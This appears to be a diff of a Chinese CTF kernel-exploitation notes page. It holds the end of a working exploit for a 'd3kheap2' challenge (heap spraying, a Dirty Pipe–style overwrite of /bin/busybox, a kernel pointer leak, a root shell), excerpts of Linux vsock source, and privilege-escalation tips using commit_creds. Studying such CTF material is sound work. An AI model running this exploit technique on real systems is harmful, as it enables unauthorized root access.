+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;open /proc/d3kheap2 success</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xa0</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xa0</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">del</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;spary sk buffer&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;del 0x31&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mh">0x31</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">splice_fd</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;Dirty pipe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">attack_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">attack_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1EA059</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">splice_fd</span><span class="p">(</span><span class="n">attack_fd</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">show_skb_buff</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x800</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nf">is_kernel_pointer</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="n">j</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;find_pipe_in_msg [%d] find_kernel_index [%d]: 0x%llx&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">addr</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">goto</span> <span class="n">success</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nl">success</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">kernel_base</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;leak success&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">addr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x800</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">attack_data</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">attack_data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pause exit to get shell&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">loge</span><span class="p">(</span><span class="s">&#34;leak failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="n1ctf-heap_master-独立cache的uaf只能一次free-外加nsjail">n1ctf heap_master (独立cache的uaf,只能一次free 外加nsjail)</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -12663,7 +13017,150 @@ A: heap overflow (off by null| off by x)</p>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="漏洞原理">漏洞原理</h3>
-<h1 id="附录">附录</h1>
+<h4 id="杂记">杂记</h4>
+<p>关键函数</p>
+<h5 id="vsock_auto_bind">vsock_auto_bind</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">vsock_auto_bind</span><span class="p">(</span><span class="k">struct</span> <span class="n">vsock_sock</span> <span class="o">*</span><span class="n">vsk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span> <span class="o">=</span> <span class="nf">sk_vsock</span><span class="p">(</span><span class="n">vsk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="n">local_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">vsock_addr_bound</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vsk</span><span class="o">-&gt;</span><span class="n">local_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">vsock_addr_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_addr</span><span class="p">,</span> <span class="n">VMADDR_CID_ANY</span><span class="p">,</span> <span class="n">VMADDR_PORT_ANY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">__vsock_bind</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">__vsock_bind_connectible</span><span class="p">(</span><span class="k">struct</span> <span class="n">vsock_sock</span> <span class="o">*</span><span class="n">vsk</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				    <span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">static</span> <span class="n">u32</span> <span class="n">port</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="n">new_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">port</span> <span class="o">=</span> <span class="nf">get_random_u32_above</span><span class="p">(</span><span class="n">LAST_RESERVED_PORT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">vsock_addr_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_addr</span><span class="p">,</span> <span class="n">addr</span><span class="o">-&gt;</span><span class="n">svm_cid</span><span class="p">,</span> <span class="n">addr</span><span class="o">-&gt;</span><span class="n">svm_port</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span><span class="o">-&gt;</span><span class="n">svm_port</span> <span class="o">==</span> <span class="n">VMADDR_PORT_ANY</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_PORT_RETRIES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">port</span> <span class="o">&lt;=</span> <span class="n">LAST_RESERVED_PORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">port</span> <span class="o">=</span> <span class="n">LAST_RESERVED_PORT</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="n">new_addr</span><span class="p">.</span><span class="n">svm_port</span> <span class="o">=</span> <span class="n">port</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">__vsock_find_bound_socket</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_addr</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">EADDRNOTAVAIL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="cm">/* If port is in reserved range, ensure caller
+</span></span></span><span class="line"><span class="cl"><span class="cm">		 * has necessary privileges.
+</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">addr</span><span class="o">-&gt;</span><span class="n">svm_port</span> <span class="o">&lt;=</span> <span class="n">LAST_RESERVED_PORT</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">		    <span class="o">!</span><span class="nf">capable</span><span class="p">(</span><span class="n">CAP_NET_BIND_SERVICE</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">EACCES</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">__vsock_find_bound_socket</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">-</span><span class="n">EADDRINUSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">vsock_addr_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vsk</span><span class="o">-&gt;</span><span class="n">local_addr</span><span class="p">,</span> <span class="n">new_addr</span><span class="p">.</span><span class="n">svm_cid</span><span class="p">,</span> <span class="n">new_addr</span><span class="p">.</span><span class="n">svm_port</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Remove connection oriented sockets from the unbound list and add them
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * to the hash table for easy lookup by its address.  The unbound list
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * is simply an extra entry at the end of the hash table, a trick used
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * by AF_UNIX.
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">__vsock_remove_bound</span><span class="p">(</span><span class="n">vsk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">__vsock_insert_bound</span><span class="p">(</span><span class="nf">vsock_bound_sockets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vsk</span><span class="o">-&gt;</span><span class="n">local_addr</span><span class="p">),</span> <span class="n">vsk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="附录">附录</h1>
 <p>punch hole可以达到和userfaultfd同等效果
 可以提权（pop rdi;init_cred;commit_creds）以后通过vfork的方式顺利的返回用户态
 slub-track 可以帮助提升</p>
